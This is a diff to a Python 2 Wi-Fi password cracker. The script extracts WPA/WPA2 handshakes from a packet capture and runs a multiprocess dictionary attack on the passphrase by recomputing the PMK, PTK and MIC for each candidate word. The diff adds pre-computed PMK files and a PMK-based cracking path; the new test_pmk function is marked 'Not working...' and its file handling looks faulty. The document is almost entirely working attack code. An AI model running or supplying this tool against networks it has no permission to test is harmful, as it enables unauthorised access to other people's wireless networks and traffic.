@@ -17,9 +17,13 @@ parser = argparse.ArgumentParser()
 parser.add_argument("-s", "--ssid", help="Specify SSID to of network to crack")
 parser.add_argument("-c", "--capture", help="Specify location of thepacket capture file")
 parser.add_argument("-w", "--wordlist", help="Specify location of the wordlist file")
+parser.add_argument("-p", "--pmk", help="Specify the pre-computed pmk wordlist file")
+parser.add_argument("--gen-pmk",
+					help="Pre-compute PMK for a certain wordlist, has to be passed with the -w option",
+					action="store_true")
 parser.add_argument("--stdin", 
 					help="Read words from stdin so word generator programs can pipe into the cracker",
-                    action="store_true")
+					action="store_true")
 prog_args = parser.parse_args()
 
 
@@ -146,18 +150,34 @@ def PRF512(pmk,A,B):
 
 def test_word(ssid, clientMac, APMac, Anonce, Snonce, mic, data):
 	global result_queue, found_password
+	pke_data = '\x00' + min(APMac,clientMac)+max(APMac,clientMac)+min(Anonce,Snonce)+max(Anonce,Snonce)
 	while not found_password:
 		word = word_queue.get(block = True, timeout = 1)
-		found_password = compare_mic(ssid, clientMac, APMac, Anonce, Snonce, mic, data, word)
+		found_password = compare_mic(ssid, clientMac, APMac, Anonce, Snonce, mic, data, pke_data, word)
 		result_queue.put((found_password, word))
 
 	return None
 
-def compare_mic(ssid, clientMac, APMac, Anonce, Snonce, mic, data, word):
-	pke = "Pairwise key expansion"
+# Not working...
+def test_pmk(clientMac, APMac, Anonce, Snonce, mic, data):
+	global result_queue, found_password, word_pmk_map
 	pke_data = '\x00' + min(APMac,clientMac)+max(APMac,clientMac)+min(Anonce,Snonce)+max(Anonce,Snonce)
+	while not found_password:
+		word = word_queue.get(block = True, timeout = 1)
+		ptk = PRF512(word_pmk_map[word], "Pairwise key expansion", pke_data)
+		kck = ptk[:16]
+
+		if ord(data[6]) & 0b00000010 == 2:
+			calculatedMic = hmac.new(kck,data,hashlib.sha1).digest()[0:16]
+		else:
+			calculatedMic = hmac.new(kck,data).digest()
+
+		result_queue.put((mic == calculatedMic, word))
+
+
+def compare_mic(ssid, clientMac, APMac, Anonce, Snonce, mic, data, pke_data, word):
 	pmk = pbkdf2_bin(word, ssid, 4096, 32)
-	ptk = PRF512(pmk, pke, pke_data)
+	ptk = PRF512(pmk, "Pairwise key expansion", pke_data)
 	kck = ptk[:16]
 
 	if ord(data[6]) & 0b00000010 == 2:
@@ -203,7 +223,47 @@ def add_from_stdin():
 	except:
 		# Exception will be raised when word_queue is full
 		pass
+
+def add_from_pmks():
+	# Read words from pmk and add correspondence to hashmap
+	# Instead of test_word in cracker pool use test_pmk
+	global word_queue, found_password, word_pmk_map
+	with open(prog_args.pmk, "r") as pmk_file:
+			print "[+] Loading words into cracking queue"
+			nLines = 0
+			for line in pmk_file:
+				try:
+					word, pmk = line.split(":")
+					word_queue.put(word.strip(), block = True)
+					word_pmk_map[word] = pmk.strip()
+					nLines += 1
+					print "[+] Loaded {} Word:PMK pairs from PMK File\r".format(nLines),
+				except: pass
+			print "\n"
+
+def add_from_wordlist():
+	global word_queue, found_password
+	with open(prog_args.wordlist, "r") as wordlist_file:
+			print "[+] Loading words into cracking queue"
+			nLines = 0
+			for line in wordlist_file:
+				word_queue.put(line.strip(), block = True)
+				nLines += 1
+				print "[+] Loaded {} words from wordlist\r".format(nLines),
+			print "\n"
 		
+def pre_compute_pmks(ssid):
+	outfile_name = ssid + ".pmks"
+	print "[+] Saving computed PMKS to:", outfile_name
+	with open(outfile_name, "w") as pmks_out:
+		while True: # Will break on exception which means all words were read
+			try:
+				word = word_queue.get(block = True, timeout = 1)
+				pmk = pbkdf2_bin(word, ssid, 4096, 32)
+				pmks_out.write(word + ":" + pmk + "\n")
+			except Exception as e:
+				print e
+				break
 
 def present_read_handshakes(hhandshakes):
 	headers = ["ID", "AP Mac", "Client Mac", "SSID", "Frame1", "Frame2"]
@@ -240,7 +300,10 @@ def choose_handshake(hhandshakes, ssid):
 			print "[-] Chosen handshake id must be an integer and in the presented list"
 
 	if chosen_handshake.ssid == None:
-		chosen_handshake.ssid = raw_input("Please enter the SSID of the chosen network:\n").strip()
+		if ssid != None:
+			chosen_handshake.ssid = ssid
+		else:
+			chosen_handshake.ssid = raw_input("Please enter the SSID of the chosen network:\n").strip()
 
 	return chosen_handshake
 
@@ -258,15 +321,35 @@ signal.signal(signal.SIGTSTP, interruption_handler)
 
 
 if __name__ == '__main__':
-	if not (prog_args.capture and (prog_args.stdin or prog_args.wordlist)):
+	if not ((prog_args.capture or prog_args.gen_pmk) and (prog_args.stdin or prog_args.wordlist or prog_args.pmk)):
 		print "[-] Not enough arguments to start dictionary attack!"
 		sys.exit(1)
 
 	cracker_running = False
 	found_password = False
-	word_queue = Queue(maxsize = 10000)
-	result_queue = Queue(maxsize = 10000)
+	word_queue = Queue(maxsize = 1000000)
+	result_queue = Queue(maxsize = 1000000)
+	word_pmk_map = {}
 	calculated_mics = 0
+
+	if prog_args.stdin:
+		print "[+] Starting stdin reader"
+		Thread(target=add_from_stdin).start()
+	elif prog_args.pmk:
+		print "[+] Starting PMK reader"
+		Thread(target=add_from_pmks).start()
+	else:
+		print "[+] Starting wordlist reader"
+		Thread(target=add_from_wordlist).start()
+
+	# Just Pre-Compute PMKS
+	if prog_args.gen_pmk:
+		if prog_args.ssid != None:
+			pre_compute_pmks(prog_args.ssid)
+			os._exit(0)
+		else:
+			print "[-] Please enter a SSID to pre-compute the PMKs"
+			os._exit(1)
 
 	captured_packets = rdpcap(prog_args.capture)
 	half_handshakes = find_half_handshakes(captured_packets)
@@ -274,37 +357,30 @@ if __name__ == '__main__':
 	present_read_handshakes(half_handshakes)
 	hhs = choose_handshake(half_handshakes, prog_args.ssid)
 	if hhs == None:
-		sys.exit(1)
+		os._exit(1)
 
 	cpu_count = cpu_count()
 	cracker_pool = Pool(cpu_count)
 
+	# Actually try to crack network password
 	if hhs.is_complete():
 		start_time = time.time()
 		Thread(target=count_results).start()
 		
-		args =  [	hhs.ssid, hhs.client_mac, hhs.ap_mac, 
-					hhs.aNonce, hhs.sNonce, hhs.mic, hhs.data	]
 
 		print "[+] Preparing Process Pool of size", cpu_count
-		for _ in range(cpu_count):
-			cracker_pool.apply_async(test_word, args)
+		if prog_args.pmk:
+			args =  [	hhs.client_mac, hhs.ap_mac, 
+						hhs.aNonce, hhs.sNonce, hhs.mic, hhs.data	]
+			for _ in range(cpu_count):
+				cracker_pool.apply_async(test_pmk, args)
+		else:
+			args =  [	hhs.ssid, hhs.client_mac, hhs.ap_mac, 
+						hhs.aNonce, hhs.sNonce, hhs.mic, hhs.data	]
+			for _ in range(cpu_count):
+				cracker_pool.apply_async(test_word, args)
 		cracker_pool.close()
 
-		if prog_args.stdin:
-			print "[+] Starting stdin reader"
-			Thread(target=add_from_stdin).start()
-
-		else:
-
-			with open(prog_args.wordlist, "r") as wordlist_file:
-				print "[+] Loading words into cracking queue"
-				nLines = 0
-				for line in wordlist_file:
-					word_queue.put(line.strip(), block = True)
-					nLines += 1
-					print "[+] Loaded {} words from wordlist\r".format(nLines),
-				print "\n"
 
 		while not found_password:
 			elapsed_time 	= time.time() - start_time
